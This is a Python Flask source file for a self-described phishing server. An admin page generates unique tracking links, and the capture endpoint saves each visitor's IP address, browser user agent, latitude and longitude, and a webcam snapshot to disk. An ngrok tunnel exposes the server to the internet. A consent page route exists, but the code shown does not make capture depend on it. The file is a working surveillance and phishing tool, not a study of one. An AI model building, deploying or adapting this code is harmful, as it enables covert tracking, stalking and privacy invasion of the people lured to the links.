from flask import Flask, render_template, request, jsonify
import os
import base64
import datetime
import uuid
from pyngrok import ngrok

app = Flask(__name__)

# Create a directory to store captured data if it doesn't exist
os.makedirs('captured_data', exist_ok=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture/<tracking_id>', methods=['GET'])
def capture_page(tracking_id):
    """Show the capture page with the unique ID for tracking"""
    return render_template('index.html', tracking_id=tracking_id)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    tracking_id = data.get('tracking_id', 'unknown')
    
    # Save metadata
    capture_info = {
        'tracking_id': tracking_id,
        'timestamp': timestamp,
        'ip_address': request.remote_addr,
        'user_agent': request.headers.get('User-Agent')
    }
    
    with open(f'captured_data/{tracking_id}_{timestamp}_info.txt', 'w') as f:
        for key, value in capture_info.items():
            f.write(f"{key}: {value}\n")
    
    # Save geolocation data
    if 'lat' in data and 'lon' in data:
        with open(f'captured_data/{tracking_id}_{timestamp}_geolocation.txt', 'w') as f:
            f.write(f"Latitude: {data['lat']}\n")
            f.write(f"Longitude: {data['lon']}\n")
    
    # Save webcam image if provided
    if 'image' in data:
        # Remove the data URL prefix to get just the base64 data
        image_data = data['image'].split(',')[1]
        with open(f'captured_data/{tracking_id}_{timestamp}_webcam.jpg', 'wb') as f:
            f.write(base64.b64decode(image_data))
    
    return jsonify({'status': 'success', 'message': 'Data captured successfully'})

@app.route('/consent')
def consent_page():
    return render_template('consent.html')

@app.route('/admin')
def admin():
    """Admin page to generate phishing links"""
    return render_template('admin.html')

@app.route('/generate-link')
def generate_link():
    """Generate a unique phishing link"""
    unique_id = str(uuid.uuid4())
    link = f"{request.host_url}capture/{unique_id}"
    return render_template('link.html', link=link)

if __name__ == '__main__':
    # Only use ngrok when running in development mode
    if app.debug:
        # Open a ngrok tunnel to the HTTP server
        public_url = ngrok.connect(5000)
        print(f" * ngrok tunnel \"{public_url}\" -> \"http://127.0.0.1:5000\"")
        
    # Run the app
    app.run(debug=True, host='0.0.0.0', port=5000)